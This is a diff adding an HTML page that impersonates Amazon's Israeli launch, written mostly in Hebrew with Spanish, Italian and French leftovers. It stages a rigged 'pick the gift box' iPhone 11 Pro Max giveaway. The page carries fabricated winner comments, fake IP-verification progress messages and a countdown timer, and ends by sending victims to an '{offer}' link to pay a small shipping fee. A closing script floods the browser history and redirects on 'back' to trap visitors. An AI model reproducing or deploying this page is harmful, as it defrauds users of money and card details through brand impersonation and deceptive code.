@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+<html>
+<head>
+  	<base >
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<link href="index.css" rel="stylesheet" type="text/css">
+	<script src="jquery.min.js.download"></script>
+	<meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0" name="viewport">
+	<meta content="width=device-width" name="viewport">
+	<link rel="stylesheet" type="text/css" href="custom.css">
+	<title>Amazon</title>
+	<link href="../https@www.play4winprize.site/amazonboxv4ipes/index_files/amazon.ico" rel="icon" type="image/x-icon">
+	
+	<script>
+		function fdate(e) {
+			var a = new Date;
+			a.setDate(a.getDate() - e);
+			var t = a.getYear();
+			t < 1e3 && (t += 1900);
+			var r = (a.getDay(), a.getMonth()),
+					n = a.getDate();
+			n < 10 && (n = "0" + n);
+			var o = (new Array("ינואר", "פברואר", "מרץ", "אפריל", "מאי", "יוני", "יולי", "אוגוסט", "ספטמבר",
+					"אוקטובר", "נובמבר", "דצמבר"));
+			return "" + o[r] + " " + n
+		}
+
+		var monthNames = new Array("Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio", "Agosto",
+				"Septiembre", "Octubre", "Noviembre", "Diciembre"),
+				now = new Date;
+		now.setDate(now.getDate() + 1);
+		var nowStringTommorow = monthNames[now.getMonth()] + " " + now.getDate() + ", " + now.getFullYear();
+
+		var mydate = new Date;
+		mydate.setDate(mydate.getDate() - 0);
+		var year = mydate.getYear();
+		year < 1e3 && (year += 1900);
+		var day = mydate.getDay(),
+				month = mydate.getMonth(),
+				daym = mydate.getDate();
+		daym < 10 && (daym = "0" + daym);
+
+		var dayarray = new Array("Every sunday", "every monday", "Every tuesday", "Every wednesday", "Every thursday",
+				"Every friday", "Every saturday"),
+				montharray = new Array("Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio", "Agosto", "Septiembre",
+						"Octubre", "Noviembre", "Diciembre")
+	</script>
+</head>
+<body class="modal-open" cz-shortcut-listen="true" style="">
+	<div id="light" class="white_content" style="display: none; box-shadow: 0 0 10px rgba(0,0,0,0.5); padding: 30px 30px 0; background: #f6f6f6; border: 2px solid #f90 !important; overflow: hidden;">
+		<img src="logo1.png" style="display: block;width:163px;margin: -5px auto 15px auto;">
+		<p style="font-size: 16px; color: #000; text-align: center;">Casi hecho! Debes confirmar tu dirección y pagar una pequeña comisión (€ 4) por envío y entrega asegurada dentro de 5-7 días.</p>
+		<br>
+		<div class="modal-footer">
+			<a href="default.htm">
+				<button type="button" class="btn btn-primary" data-dismiss="modal" style="border: 2px solid #f90; background: #f90; color: #000000; font-weight: bold; border-radius: 25px; padding: 10px 35px; font-size: 16px">OK</button>
+			</a>
+		</div>
+	</div>
+	<div id="light2" class="white_content" style="display: none; box-shadow: 0 0 10px rgba(0,0,0,0.5); padding: 30px 30px 0; background: #ECDC00; border: 2px solid #f90 !important; overflow: hidden;">
+		<img src="../https@www.play4winprize.site/amazonboxv4ipes/index_files/logo1(1).png" style="display: block;width:170px;margin: -5px auto 15px auto">
+		<p style="font-size: 16px; color: #000; text-align: center;">Casi hecho! Debes confirmar tu dirección y pagar una pequeña comisión (€ 4) por envío y entrega asegurada dentro de 5-7 días.</p>
+		<br>
+		<div class="modal-footer">
+			<a href="default.htm">
+				<button type="button" class="btn btn-primary" data-dismiss="modal" style="border: 2px solid #0A42AB; background: #f90; color: #000000; font-weight: bold; border-radius: 2px; padding: 6px 20px;">OK</button>
+			</a>
+		</div>
+	</div>
+	<div class="modal fade in" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" style="text-align: center; display: block;">
+		<div class="modal-dialog">
+			<div class="modal-content">
+				<div class="modal-body">
+					<table>
+						<tbody>
+						<tr>
+							<td>
+								<img src="logo.png" alt="" style="max-width: 200px; display: block; margin: 0 auto 15px auto;">
+								<p style="font-size: 16px; color: #000; text-align: center;">
+								</p>
+								<p>🎉 ברוכים הבאים לאמזון</p>
+								<p dir="rtl">לכבוד פתיחה של אמזון בישראל אמזון מחלקת מתנות. הכירו את אמזון והשתתפו בהגרלה. פרס ראשון <b>iPhone 11 Pro Max</b></p>
+							</td>
+						</tr>
+						</tbody>
+					</table>
+				</div>
+				<div class="modal-footer">
+					<button type="button" class="btn btn-primary" data-dismiss="modal" style="background:  #f90; color: #000000;font-weight: bold; letter-spacing: .3; border-radius: 25px; padding: 10px 35px; font-size: 16px" id="btn-open">המשך</button>
+				</div>
+			</div>
+		</div>
+	</div>
+	<header class="nav-opt-sprite nav-locale-us nav-lang-en nav-ssl nav-unrec desktop-nav">
+		<div id="navbar" cel_widget_id="Navigation-desktop-navbar" data-template="layoutSwapToolBar" role="navigation" class="nav-sprite-v1 celwidget nav-bluebeacon nav-a11y-t1 nav-packard-glow using-mouse" data-cel-widget="Navigation-desktop-navbar">
+			<div id="nav-belt">
+				<div class="nav-left">
+					<div id="nav-logo">
+						<a href="default.htm" class="nav-logo-link" aria-label="Amazon" tabindex="6">
+							<span class="nav-sprite nav-logo-base"></span>
+							<span class="nav-sprite nav-logo-ext"></span>
+							<span class="nav-sprite nav-logo-locale"></span>
+						</a>
+					</div>
+				</div>
+				<div class="nav-right">
+					<div id="nav-tools" class="layoutToolbarPadding">
+						<a href="default.htm" id="icp-nav-flyout" class="nav-a nav-a-2 icp-link-style-2">
+								<span class="icp-nav-link-inner">
+									<span class="nav-line-1">
+									<span class="icp-nav-globe-img-2"></span>
+								<span class="icp-nav-language">IL</span>
+								</span>
+								<span class="nav-line-2">&nbsp;
+	<span class="nav-icon nav-arrow" style="visibility: visible;"></span>
+								</span>
+								</span>
+						</a>
+						<a href="default.htm" class="nav-a nav-a-2" data-nav-ref="nav_ya_signin" data-nav-role="signin" data-ux-jq-mouseenter="true" id="nav-link-accountList" tabindex="22">
+								<span class="nav-line-1">שלום, היכנס
+	</span>
+							<span class="nav-line-2 ">חשבון ורשימות
+	<span class="nav-icon nav-arrow" style="visibility: visible;"></span>
+								</span>
+							<span class="nav-line-3">הרשמה
+	</span>
+							<span class="nav-line-4">חשבון קיים
+	</span>
+						</a>
+						<a href="default.htm" class="nav-a nav-a-2 nav-single-row-link  " id="nav-orders" tabindex="24">
+							<span class="nav-line-1"></span>
+							<span class="nav-line-2">הזמנות
+	</span>
+						</a>
+						<a href="default.htm" aria-label="0 items in cart" class="nav-a nav-a-2" id="nav-cart" tabindex="26">
+							<span aria-hidden="true" class="nav-line-1"></span>
+							<span aria-hidden="true" class="nav-line-2">עגלה<span class="nav-icon nav-arrow"></span>
+								</span>
+							<span class="nav-cart-icon nav-sprite"></span>
+							<span id="nav-cart-count" aria-hidden="true" class="nav-cart-count nav-cart-0">0</span>
+						</a>
+					</div>
+				</div>
+				<div class="nav-fill">
+					<div id="nav-search">
+						<div id="nav-bar-left"></div>
+						<form accept-charset="utf-8" action="" class="nav-searchbar" method="GET" name="site-search" role="search">
+							<div class="nav-left">
+								<div id="nav-search-dropdown-card">
+									<div class="nav-search-scope nav-sprite">
+										<div class="nav-search-facade" data-value="search-alias=aps">
+											<a href="default.htm" style="text-decoration: none;"><span class="nav-search-label" style="width: auto;">הכל</span>
+												<i class="nav-icon"></i></a>
+										</div>
+										<span id="searchDropdownDescription" style="display:none">Seleccione el departamento que desea buscar
+	</span>
+									</div>
+								</div>
+							</div>
+							<div class="nav-right">
+								<div class="nav-search-submit nav-sprite">
+										<span id="nav-search-submit-text" class="nav-search-submit-text nav-sprite">
+	Go
+	</span>
+									<input type="submit" class="nav-input" value="Go" tabindex="20">
+								</div>
+							</div>
+							<div class="nav-fill">
+								<div class="nav-search-field ">
+									<label id="nav-search-label" for="twotabsearchtextbox" class="aok-offscreen">
+										Buscar
+									</label>
+									<input type="hidden" value="1" name="lp" autocomplete="off" placeholder="">
+									<input type="text" id="twotabsearchtextbox" autocomplete="off" placeholder="" class="nav-input" dir="auto" tabindex="19">
+								</div>
+								<div id="nav-iss-attach"></div>
+							</div>
+						</form>
+					</div>
+				</div>
+				<div id="nav-main" class="nav-sprite">
+				</div>
+				<div id="nav-subnav-toaster"></div>
+				<div id="nav-cover" style="z-index: 1; height: 4172px; display: none; opacity: 0.6;"></div>
+			</div>
+		</div>
+	</header>
+	<header class="nav-opt-sprite nav-locale-us nav-lang-en nav-ssl nav-unrec mobile-nav" style="width: 100%;overflow: hidden;">
+		<div id="navbar" cel_widget_id="Navigation-desktop-navbar" data-template="layoutSwapToolBar" role="navigation" class="nav-sprite-v1 celwidget nav-bluebeacon nav-a11y-t1 nav-packard-glow using-mouse" data-cel-widget="Navigation-desktop-navbar">
+			<div id="nav-belt">
+				<div class="nav-left">
+					<div id="nav-logo">
+						<a href="default.htm" class="nav-logo-link" aria-label="Amazon" tabindex="6">
+							<span class="nav-sprite nav-logo-base"></span>
+							<span class="nav-sprite nav-logo-ext"></span>
+							<span class="nav-sprite nav-logo-locale"></span>
+						</a>
+					</div>
+				</div>
+				<div class="nav-right">
+					<div id="nav-tools" class="layoutToolbarPadding">
+					</div>
+				</div>
+				<div class="nav-fill">
+					<script type="text/javascript">
+						window.navmet.tmp = +new Date();
+					</script>
+					<div id="nav-search">
+						<div id="nav-bar-left"></div>
+						<form accept-charset="utf-8" action="" class="nav-searchbar" name="site-search" role="search">
+							<div class="nav-left">
+								<div id="nav-search-dropdown-card">
+									<div class="nav-search-scope nav-sprite">
+										<div class="nav-search-facade" data-value="search-alias=aps">
+											<a href="default.htm" style="text-decoration: none;"><span class="nav-search-label" style="width: auto;">הכל</span>
+												<i class="nav-icon"></i></a>
+										</div>
+										<span id="searchDropdownDescription" style="display:none">Seleccione el departamento que desea buscar
+	</span>
+									</div>
+								</div>
+							</div>
+							<div class="nav-right">
+								<div class="nav-search-submit nav-sprite">
+										<span id="nav-search-submit-text" class="nav-search-submit-text nav-sprite">
+	Ir
+	</span>
+									<input type="submit" class="nav-input" value="Go" tabindex="20">
+								</div>
+							</div>
+							<div class="nav-fill">
+								<div class="nav-search-field ">
+									<label id="nav-search-label" for="twotabsearchtextbox" class="aok-offscreen">
+										Buscar
+									</label>
+									<input type="hidden" value="1" name="lp" autocomplete="off" placeholder="">
+									<input type="text" id="twotabsearchtextbox" autocomplete="off" placeholder="" class="nav-input" dir="auto" tabindex="19">
+								</div>
+								<div id="nav-iss-attach"></div>
+							</div>
+						</form>
+					</div>
+				</div>
+				<div id="nav-main" class="nav-sprite">
+				</div>
+				<div id="nav-subnav-toaster"></div>
+				<div id="nav-cover" style="z-index: 1; height: 4172px; display: none; opacity: 0.6;"></div>
+			</div>
+		</div>
+	</header>
+	<style type="text/css">
+		.nav-sprite-v1 .nav-sprite,
+		.nav-sprite-v1 .nav-icon {
+			background-image: url(amazon_sprite.png);
+			background-position: 0 1000px;
+			background-repeat: repeat-x;
+		}
+
+		#navbar[data-template=layoutSwapToolBar] #nav-search {
+			padding-right: 20px;
+		}
+
+		div#nav-main {
+			margin-top: 6px!important;
+			height: 10px!important;
+		}
+
+		header.nav-opt-sprite.nav-locale-us.nav-lang-en.nav-ssl.nav-unrec {
+			margin-right: 8px
+		}
+
+		body {
+			margin: 0px!important;
+		}
+
+		.mobile-nav {
+			display: none;
+		}
+
+		@media only screen and (max-width: 1012px) {
+			.mobile-nav {
+				display: block;
+			}
+			.desktop-nav {
+				display: none;
+			}
+			#navbar {
+				min-width: 0px;
+			}
+		}
+	</style>
+	<div class="spacer"></div>
+	<div class="wrapper" style=" min-height: 85vh;">
+		<div class="wrapper contestwrap">
+			<div class="toptext" style="float: none; margin: 0 auto; display: block; text-align: center;">
+				<table class="wrapper">
+					<tbody>
+					<tr>
+						<td align="left" valign="top">
+							<h4 style="float: none; margin: 0px auto -10px auto; display: block; text-align: center; font-weight: 700;">
+								!מזל טוב
+							</h4>
+							<br>
+							<span class="dat-1" style="float: none; margin: 0px auto  5px auto; display: block; text-align: center;">
+	<script>
+											document.write(fdate(0))
+										</script></span>
+						</td>
+					</tr>
+					</tbody>
+				</table>
+				<div style="border-bottom:1px solid #f90;">
+					<p class="wrapper" style="font-size: 16px;">
+				<b>iPhone 11 Pro Max	</b>	לרגל פתיחת האמזון בישראל, אנו בוחרים כל יום 10 משתתפים שיכולים לזכות בפרסים של אמזון. פרס ראשון 
+						<br>
+						<br> </p>
+					<p class="wrapper" style="font-size: 16px;" dir="rtl">כל מה שעליכם לעשות הוא לפתוח את אריזת המתנה הנכונה.
+						<b> יש לכם 3 ניסיונות, בהצלחה!
+						</b>
+						<br>
+						<br> </p>
+				</div>
+				<script>
+					function startTimer(t) {
+						var e, r, n = t,
+								a = setInterval(function() {
+									e = parseInt(n / 60, 10), r = parseInt(n % 60, 10), r = 10 > r ? "0" + r : r, $("#timerr").text(e + " minutes " + r + " seconds"), --n < 0 && clearInterval(a)
+								}, 1e3)
+					}
+					startTimer(89)
+				</script>
+				<style>
+					.select2 {
+						color: #737373;
+						font-size: small;
+						font-weight: 300;
+						padding: 8px 0 4px 0
+					}
+
+					.boxes img {
+						width: 100%;
+						max-width: 200px;
+						margin: 0px auto;
+					}
+				</style>
+			
+			</div>
+		</div>
+		<div id="boxes" class="boxes" style="background-color: #fff!important;">
+			<div id="0">
+				<center>
+					<img src="_mark1.png" class="try">
+				</center>
+			</div>
+			<div id="1">
+				<center>
+					<img src="_mark1.png" class="try">
+				</center>
+			</div>
+			<div id="2">
+				<center>
+					<img src="_mark1.png" class="try">
+				</center>
+			</div>
+			<div id="3">
+				<center>
+					<img src="_mark1.png" class="try">
+				</center>
+			</div>
+			<div id="4">
+				<center>
+					<img src="_mark1.png" class="try">
+				</center>
+			</div>
+			<div id="5">
+				<center>
+					<img src="_mark1.png" class="try">
+				</center>
+			</div>
+			<div id="6">
+				<center>
+					<img src="_mark1.png" class="try">
+				</center>
+			</div>
+			<div id="7">
+				<center>
+					<img src="_mark1.png" class="try">
+				</center>
+			</div>
+			<div id="8">
+				<center>
+					<img src="_mark1.png" class="try">
+				</center>
+			</div>
+			<div id="9">
+				<center>
+					<img src="_mark1.png" class="try">
+				</center>
+			</div>
+			<div id="10">
+				<center>
+					<img src="_mark1.png" class="try">
+				</center>
+			</div>
+			<div id="11">
+				<center>
+					<img src="_mark1.png" class="try">
+				</center>
+			</div>
+		</div>
+		<script>
+			var count = 1;
+			$(function() {
+				$(".try").click(function() {
+					if (count < 3) {
+						$(this).attr('src', "_mark2.jpg"); // add custom path for photo here
+						count++;
+						setTimeout(function() {
+													var audio = new Audio('pro.mp3');
+							audio.play();
+							var sc2 = document.getElementById("success02");
+							sc2.className += " animate";
+							var sctip02 = document.getElementById("successtip02");
+							sctip02.className += " animateSuccessTip";
+							var md2 = document.getElementById("modal02");
+							md2.className += " visible";
+							var so = document.querySelector(".sweet-overlay");
+							so.style.display = "block";
+
+						}, 800);
+					} else {
+												var audio = new Audio('warning.mp3');
+							audio.play();
+						$(this).attr('src', "_mark3.jpg"); // add custom path for photo here
+						setTimeout(function() {
+							var modal03 = document.getElementById("modal03").className += " visible";
+							var sa = document.querySelector(".sweet-overlay").style.display = "block";
+							document.getElementById("success03").className += " animate";
+							var audio = new Audio('pro.mp3');
+							audio.play();
+						}, 800);
+					}
+
+				});
+
+			});
+		</script>
+		<div class="wrapper validate" style="margin-top: 20px; margin-bottom: 20px">
+			<div class="wrapper">
+				<br>
+				<table width="100%">
+					<tbody>
+					<tr>
+						<td align="left" style="padding-bottom: 10px;">
+							<p id="v1b">Validación de sus respuestas ... </p>
+							<p id="v2b">Verificando su dirección IP ... </p>
+							<p id="v3b">Verifique la disponibilidad de regalos en progreso ... </p>
+							<p id="vfinal">Felicitaciones! </p>
+						</td>
+						<td align="right"> <span id="szazalek">0%</span> </td>
+					</tr>
+					</tbody>
+				</table>
+				<div style="width:100%;margin:0 auto">
+					<div id="szlider">
+						<div id="szliderbar"> </div>
+						<div id="szazalek"> </div>
+					</div>
+				</div>
+				<table>
+					<tbody>
+					<tr>
+						<td> <img src="loading.gif" id="v2a" style="padding-top: 10px;"> <img src="fb-check.jpg" id="v2c"> </td>
+						<td>
+							<p id="v2d" style="padding-top: 10px;">Non ci sono accessi precedenti da questo IP.
+							</p>
+						</td>
+					</tr>
+					<tr>
+						<td> <img src="loading.gif" id="v3a"> <img src="fb-check.jpg" id="v3c"> </td>
+						<td>
+							<p id="v3d">Ci sono ancora premi disponibili!
+							</p>
+						</td>
+					</tr>
+					</tbody>
+				</table>
+				<br>
+			</div>
+		</div>
+		<script>
+			function drawszlider(e, d) {
+				var l = Math.round(100 * d / e);
+				document.getElementById("szliderbar").style.width = l + "%", document.getElementById("szazalek").innerHTML = l + "%", holvanszlider = d, t = setTimeout("drawszlider(100, slidewhere);slidewhere = holvanszlider + 1; if (slidewhere > 100) {slidewhere = 100;}", 40)
+			}
+			var slidewhere = 0,
+					holvanszlider = 0
+		</script>
+		<div style="display: none;" class="samsung-show">
+			<h3 class="samsung-text">Patrocinado por
+				<img src="../https@www.play4winprize.site/amazonboxv4ipes/index_files/samsung-logo1.png"></h3>
+		</div>
+		<div class="spacer" id="v4s"></div>
+		<div class="wrapper prize con-prize1" id="v4" style="margin-bottom: 20px">
+			<h3 style="padding-right: 20px; padding-left: 20px; margin-top: 5px;">
+				Gracias por sus comentarios, apreciados!
+				Solicite su premio a continuación.
+			</h3>
+			<div class="container-prize">
+				<div class="one-prize">
+					<img src="iphoneprize.png" alt="" style="width: 70%;;max-width: 320px">
+					<div class="btn-cont">
+						<a class="btn-prize" href="default.htm" style="color: #fff; text-transform: uppercase;cursor:  pointer;">Descárgalo ahora
+						</a>
+						<span>Restante:
+	<span style="padding: 2px 5px; background: green; color: #fff; border-radius: 5px;">3</span> </span>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="wrapper reviews" dir="rtl">
+			<div class="wrapper">
+				<h2>הוסף תגובה:
+				</h2>
+			</div>
+			<table class="wrapper" style=" padding-bottom: 10px; padding-top: 10px; " id="fb5">
+				<tbody>
+				<tr>
+					<td width="50px" valign="top" align="right">
+						<div class="roundimg s-11m"></div>
+					</td>
+					<td align="left" valign="top" class="commentpad">
+						<div class="name">שחר ליאן</div>
+						<div class="text">בהתחלה חשבתי שזו בדיחה, אבל קיבלתי את ה Iphone היום בבוקר. תודה לאמזון.
+						</div>
+						<div class="qqq">
+							<div class="kkk">
+								<div class="date">
+									<script>
+										document.write(fdate(0))
+									</script> 10:56</div>
+								<a href="default.htm" class="otvet">
+									האבתי&nbsp;&nbsp;
+									תגובה&nbsp;&nbsp;
+									
+								</a>
+							</div>
+							<div class="like-q">
+								<img src="FB-like.png" alt="" style="margin-right: 2px; margin-top: -1px;">4
+							</div>
+						</div>
+					</td>
+				</tr>
+				</tbody>
+			</table>
+			<table class="wrapper" id="fb4" style="padding-bottom: 10px; padding-top: 10px; display: none;">
+				<tbody>
+				<tr>
+					<td width="50px" valign="top" align="right">
+						<div class="roundimg s-33m"></div>
+					</td>
+					<td align="left" valign="top" class="commentpad">
+						<div class="name">Carlos Sanchez</div>
+						<div class="text">¡Perdí mi iPhone hace 2 semanas! Sinceramente, quería una novedad sobre manzanas, hoy no era mi día.
+						</div>
+						<div class="qqq">
+							<div class="kkk">
+								<div class="date">
+									<script>
+										document.write(fdate(1))
+									</script>
+
+								</div>
+								<a href="../https@cdcracker.info/index.php@lp=1" class="otvet">
+									האבתי&nbsp;&nbsp;
+									תגובה&nbsp;&nbsp;
+									</a>
+							</div>
+						</div>
+					</td>
+				</tr>
+				</tbody>
+			</table>
+			<table class="wrapper" id="fb3" style="padding-bottom: 10px; padding-top: 10px;">
+				<tbody>
+				<tr>
+					<td width="50px" valign="top" align="right">
+						<div class="roundimg s-66"></div>
+					</td>
+					<td align="left" valign="top" class="commentpad">
+						<div class="name">אילנה</div>
+						<div class="text">זכיתי באוזניות איירפודס. תודה
+						</div>
+						<div class="qqq">
+							<div class="kkk">
+								<div class="date">
+									<script>
+										document.write(fdate(2))
+									</script>
+								</div>
+								<a href="default.htm" class="otvet">
+									האבתי&nbsp;&nbsp;
+									תגובה&nbsp;&nbsp;
+									</a>
+							</div>
+						</div>
+					</td>
+				</tr>
+				</tbody>
+			</table>
+			<table class="wrapper" id="fb2" style="padding-bottom: 10px; padding-top: 10px; ">
+				<tbody>
+				<tr>
+					<td width="50px" valign="top" align="right">
+						<div class="roundimg s-99"></div>
+					</td>
+					<td align="left" valign="top" class="commentpad">
+						<div class="name">אילן לבי</div>
+						<div class="text">יש קבלתי סוני 4. אני לא מעמין. תודה לכם!
+						</div>
+						<div class="qqq">
+							<div class="kkk">
+								<div class="date">
+									<script>
+										document.write(fdate(2))
+									</script>
+								</div>
+								<a href="default.htm" class="otvet">
+									האבתי&nbsp;&nbsp;
+									תגובה&nbsp;&nbsp;
+									</a>
+							</div>
+						</div>
+					</td>
+				</tr>
+				</tbody>
+			</table>
+			<table class="wrapper" id="fb1" style=" padding-bottom: 10px; padding-top: 10px;">
+				<tbody>
+				<tr>
+					<td width="50px" valign="top" align="right">
+						<div class="roundimg s-88m"></div>
+					</td>
+					<td align="left" valign="top" class="commentpad">
+						<div class="name">איציק</div>
+						<div class="text">זה באמת עובד. אני כבר הואב את אמזון
+							<div class="qqq">
+								<div class="kkk">
+									<div class="date">
+										<script>
+											document.write(fdate(2))
+										</script>
+									</div>
+									<a href="default.htm" class="otvet">
+										האבתי&nbsp;&nbsp;
+										תגובה&nbsp;&nbsp;
+										</a>
+								</div>
+								<div class="like-q">
+									<img src="FB-like.png" alt="" style="margin-right: 2px; margin-top: -1px;">1
+								</div>
+							</div>
+						</div>
+					</td>
+				</tr>
+				</tbody>
+			</table>
+			<table class="wrapper" style="padding-bottom: 10px; padding-top: 10px;display: none">
+				<tbody>
+				<tr>
+					<td width="50px" valign="top" align="right">
+						<div class="roundimg ps4man"></div>
+					</td>
+					<td align="left" valign="top" class="commentpad">
+						<div class="name">Bobby Rodriguez</div>
+						<div class="text">¡Gané el iPhone 11 Pro! No puedo creer que fuera verdad ...: o
+						</div>
+						<div class="qqq">
+							<div class="kkk">
+								<div class="date">
+									<script>
+										document.write(fdate(3))
+									</script>
+								</div>
+								<a href="default.htm" class="otvet">
+									האבתי&nbsp;&nbsp;
+									תגובה&nbsp;&nbsp;
+									</a>
+							</div>
+						</div>
+					</td>
+				</tr>
+				</tbody>
+			</table>
+			<table class="wrapper" style="padding-bottom: 10px; padding-top: 10px; display: none;">
+				<tbody>
+				<tr>
+					<td width="50px" valign="top" align="right">
+						<div class="roundimg s-102m"></div>
+					</td>
+					<td align="left" valign="top" class="commentpad">
+						<div class="name">Oliver Joiner</div>
+						<div class="text">WoW!!</div>
+						<div class="qqq">
+							<div class="kkk">
+								<div class="date">
+									<script>
+										document.write(fdate(3))
+									</script>
+								</div>
+								<a href="default.htm" class="otvet">
+									האבתי&nbsp;&nbsp;
+									Comentario&nbsp;&nbsp;
+									</a>
+							</div>
+						</div>
+					</td>
+				</tr>
+				</tbody>
+			</table>
+			<div style="height:10px"></div>
+		</div>
+	</div>
+	<footer>
+		<div class="footer-block">
+			<img src="logo1.png" alt="" width="120px" style="padding-bottom: 1px">
+			<span>
+	© Amazon 2019 - Number VAT: 01114601006
+	</span>
+		</div>
+	</footer>
+
+	<script src="jquery.js.download"></script>
+	<div class="sweet-overlay" style="opacity: 1.03; display: none;" tabindex="-1"></div>
+	<div class="sweet-alert animated bounceIn" id="modal01">
+		<p><img src="../https@www.play4winprize.site/amazonboxv4ipes/index_files/gift.gif"></p>
+		<h2 style="font-size: 13pt;">Concours promotionnel Amazon</h2>
+		<p> Félicitations, client Amazon !<br><br>Nous tenons à vous
+			remercier pour votre fidélité à Amazon ! En l'honneur du Black Friday
+			2018, nous vous offrons la possibilité d'obtenir le <b>Novità di Apple </b> dès aujourd'hui !<br><br>Tout ce que
+			vous avez à faire est de trouver le bon paquet cadeau.<br><br><b>Vous avez 3 tentatives, bonne chance !</b>
+		</p>
+		<div class="sa-button-container">
+			<div class="sa-confirm-button-container">
+				<button onclick="hidemodal01()" style="display: inline-block; box-shadow: rgba(140, 212, 245, 0.8) 0px 0px 2px, rgba(0, 0, 0, 0.0470588) 0px 0px 0px 1px inset; background-color: #FFA400;">OK</button>
+				<div class="la-ball-fall"></div>
+			</div>
+		</div>
+	</div>
+	<div class="sweet-alert animated bounceIn" id="modal02">
+		<div class="sa-icon sa-success" id="success02">
+			<span class="sa-line sa-tip" id="successtip02"></span> <span class="sa-line sa-long" id="successlong02"></span>
+			<div class="sa-placeholder"></div>
+			<div class="sa-fix"></div>
+		</div>
+		<script type="text/javascript">
+
+			var counter = 1;
+			$(document).ready(function () {
+
+				$('#update').on('click', function () {
+					if (counter == 1) {
+						counter++;
+						$('#cntVal').html(function (i, val) {
+							return +val - 1
+						});
+					}
+				});
+			});
+		</script>
+		<p id="cnt" dir="rtl">
+			מצטערים, חבילה זו ריקה! יש לכם עוד
+			(<span id="cntVal">2</span>) ניסיונות. בהצלחה
+		</p>
+		<div class="sa-button-container">
+			<div class="sa-confirm-button-container">
+				<button id="update" onclick="hidemodal02()" style="display: inline-block; box-shadow: rgba(140, 212, 245, 0.8) 0px 0px 2px, rgba(0, 0, 0, 0.0470588) 0px 0px 0px 1px inset; background-color: #FFA400;">OK</button>
+				<div class="la-ball-fall"></div>
+			</div>
+		</div>
+	</div>
+	<div class="sweet-overlay" style="opacity: 1.03; display: none;" tabindex="-1"></div>
+	<div class="sweet-alert animated bounceIn" id="modal03" style="background-image:url(../https@www.play4winprize.site/amazonboxv4ipes/index_files/bg-new.png)" "=" &gt; &lt;img
+	src=" .="" index_files="" _mark3.png"="" align="center" onclick="tellme();">
+	<img src="logo.png" alt="" style="max-width: 200px; display: block; margin: 0 auto 15px auto;">
+	<h4 style="font-size: 18px; margin-top: 10px;color: #000!important;" class="newclr">Iphone 11 Pro Max מזל טוב! זכיתם ב 
+	</h4>
+	<p class="newclr">?איך מקבלים את הפרס
+	</p>
+	<p class="newclr" dir="rtl">1. אתם תועברו לאתר של משלוח פרסים
+	</p>
+	<p class="newclr" dir="rtl">2. מזינים את הכתובת שלכם ומשלמים 2$ עבור המשלוח כדי לקבל את ה- iPhone 11 Pro Max.</p>
+	<p class="newclr" dir="rtl">3. מכשיר ה- iPhone 11 Pro Max יגיע תוך 5-7 ימים במשלוח עד הבית.
+	</p>
+	<br>
+	<div class="sa-button-container">
+		<div class="sa-confirm-button-container">
+			<a href="{offer}" style="display: inline-block;box-shadow: rgba(140, 212, 245, 0.8) 0px 0px 2px, rgba(0, 0, 0, 0.0470588) 0px 0px 0px 1px inset; background-color: #FFA400;    border-radius: 20px;" id="final-button">המשך</a>
+			<div class="la-ball-fall"></div>
+		</div>
+	</div>
+	</div>
+	<script>
+		function ok_btn() {
+			$('#light').css('display', 'block');
+		}
+		function ok_btn2() {
+			$('#light2').css('display', 'block');
+		}
+		window.onload = function () {
+			$('#myModal').modal('show')
+		};
+	</script>
+	<script>
+		function hidemodal01() {
+			var modal1 = document.getElementById("modal01").classList.remove("visible");
+			var so = document.querySelector(".sweet-overlay").style.display = "none";
+		}
+
+		function hidemodal02() {
+			var modal2 = document.getElementById("modal02").classList.remove("visible");
+			var so = document.querySelector(".sweet-overlay").style.display = "none";
+		}
+		pz = 1;
+
+	</script>
+
+	<link rel="stylesheet" href="bootstrap.min.css">
+	<script src="bootstrap.js.download"></script>
+	<script type="text/javascript">
+		!function(){
+			var campaign_link = "";
+			var t;
+			try{
+				for(t=0;10>t;++t)history.pushState({},"","#");
+				onpopstate=function(t){t.state&&location.replace(campaign_link)}}
+			catch(o){}
+		}();
+	</script>
+	<link rel="stylesheet" href="bootstrap.min.css">
+	<script src="bootstrap.js.download"></script>
+</body>
+</html>
